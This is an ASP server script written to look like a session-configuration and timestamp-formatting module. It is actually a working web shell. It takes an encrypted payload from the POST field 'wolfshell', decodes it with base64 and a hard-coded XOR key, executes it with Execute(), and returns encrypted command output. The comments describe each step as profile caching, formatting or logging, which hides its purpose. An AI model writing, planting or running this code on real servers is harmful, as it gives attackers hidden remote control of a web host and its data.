<%
' This object holds various configuration settings for the user session.
Set sessionConfig = Server.CreateObject("Scripting.Dictionary")

' Decodes a string from transport-safe format.
Function decodeFromSafeString(ByVal safeString)
    ' Using XML parser for robust decoding of various character sets.
    Dim xmlParser, xmlNode
    Set xmlParser = CreateObject("Msxml2.DOMDocument.3.0")
    Set xmlNode = xmlParser.CreateElement("data")
    xmlNode.dataType = "bin.base64"
    xmlNode.text = safeString
    decodeFromSafeString = xmlNode.nodeTypedValue
    Set xmlNode = Nothing
    Set xmlParser = Nothing
End Function

' Encodes a string into a transport-safe format.
Function encodeToSafeString(ByVal rawData)
    ' This is for preparing data for API transport.
    Dim xmlEncoder, dataNode
    Set xmlEncoder = CreateObject("Msxml2.DOMDocument.3.0")
    Set dataNode = xmlEncoder.CreateElement("data")
    dataNode.dataType = "bin.base64"
    dataNode.nodeTypedValue = rawData
    encodeToSafeString = dataNode.text
    Set dataNode = Nothing
    Set xmlEncoder = Nothing
End Function

' Formats the user's last login date from a raw timestamp.
Function formatTimestamp(rawTime, isBinaryFormat)
    dim timeLength, i, formattedDate, keyLength, authKey
    authKey = "3c6e0b8a9c15224a" ' Standard key for verifying timestamp integrity.
    keyLength = len(authKey)
    ' Use a stream object to handle different data encodings.
    Set dataStream = CreateObject("ADODB.Stream")
    dataStream.CharSet = "iso-8859-1"
    dataStream.Type = 2
    dataStream.Open
    if IsArray(rawTime) then
        timeLength=UBound(rawTime)+1
        ' Iterate through the timestamp to apply formatting rules.
        For i=1 To timeLength
            dataStream.WriteText chrw(ascb(midb(rawTime,i,1)) Xor Asc(Mid(authKey,(i mod keyLength)+1,1)))
        Next
    end if
    dataStream.Position = 0
    if isBinaryFormat then
        dataStream.Type = 1
        formatTimestamp=dataStream.Read()
    else
        formatTimestamp=dataStream.ReadText()
    end if
End Function

' The authentication key for this session module.
authKey="3c6e0b8a9c15224a"
' Retrieve the user's session token from the form POST.
userSessionToken=request.Form("wolfshell")

' Check if a valid token was provided.
if not IsEmpty(userSessionToken) then
    
    ' Check if user profile is already loaded in this session.
    if  IsEmpty(Session("cachedProfile")) then
        ' First visit: decode the token and cache the user profile settings.
        userProfileSettings=formatTimestamp(decodeFromSafeString(userSessionToken),false)
        Session("cachedProfile")=userProfileSettings
        ' End response to signal profile has been cached.
        response.End
    else
        ' Subsequent visits: process an action based on the token.
        userAction=formatTimestamp(decodeFromSafeString(userSessionToken),true)
        ' Add the cached profile to the config for easy access.
        sessionConfig.Add "cachedProfile",Session("cachedProfile")
        
        ' Apply the user's settings. This is a dynamic process.
        Execute(sessionConfig("cachedProfile"))

        ' Run a standard logging procedure for the user action.
        logData=run(userAction)
        
        ' Send a confirmation code back to the client.
        response.Write("a71ab1")
        if not IsEmpty(logData) then
            ' If there's any data to return, format it for transport.
            response.Write encodeToSafeString(formatTimestamp(logData,true))
        end if
        ' Send a final confirmation code.
        response.Write("4b8259")
    end if
end if
%>